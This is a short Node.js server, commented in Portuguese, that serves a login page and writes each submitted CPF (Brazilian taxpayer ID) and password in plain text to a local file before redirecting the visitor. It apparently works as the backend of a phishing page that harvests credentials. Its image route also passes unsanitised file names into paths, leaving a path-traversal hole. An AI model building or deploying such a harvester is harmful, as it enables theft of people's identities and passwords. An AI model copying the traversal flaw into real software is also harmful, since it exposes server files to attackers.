const http = require('http')
const fs = require('fs')
const path = require('path')

const port = 3000

const server = http.createServer((req,res)=>{
    const urlInfo = require('url').parse(req.url,true)
    const cpf = String(urlInfo.query.cpf)
    const senha = urlInfo.query.senha

    if (req.url === '/style.css') { // Condição para servir o arquivo CSS
        fs.readFile(path.join(__dirname, 'site-login', 'style.css'), (err, data) => { // Ler o arquivo CSS
          if (err) {
            res.writeHead(404, { 'Content-Type': 'text/plain' });
            res.write('404 Not Found');
            return res.end();
          }
          res.writeHead(200, { 'Content-Type': 'text/css' }); // Definir o tipo de conteúdo como CSS
          res.write(data);
          return res.end();
        });
      }  else if (req.url.startsWith('/images/')) { // Supondo que as imagens estão em um diretório chamado 'images'
        const imageName = req.url.substring(8); // Remover '/images/' do início do URL
        fs.readFile(path.join(__dirname, 'site-login', 'images', imageName), (err, data) => {
          if (err) {
            res.writeHead(404, { 'Content-Type': 'text/plain' });
            res.write('404 Not Found');
            return res.end();
          }
          // Determinar o tipo de conteúdo com base na extensão do arquivo
          const extension = path.extname(imageName);
          const contentType = `image/${extension.substring(1)}`;
          res.writeHead(200, { 'Content-Type': contentType });
          res.write(data);
          return res.end();
        });
      } else if(!cpf || !senha){
        fs.readFile('site-login/index.html',(err,data)=>{
            res.writeHead(200,
                {'Content-Type':'text/html'})
                res.write(data)
                return res.end()
        })
    }else{
        const fileContent = `CPF: ${cpf}, Senha: ${senha}\n`;
        fs.writeFile('arquivo.txt',fileContent,(err)=>{
            if(err){
                console.log('Erro: ', err)
            }
            res.writeHead(302,{
                location:'/'
            })
            return res.end()
        })
    }
    
})

server.listen(port,()=>{
    console.log(`Servidor rodando na porta ${port}`)
})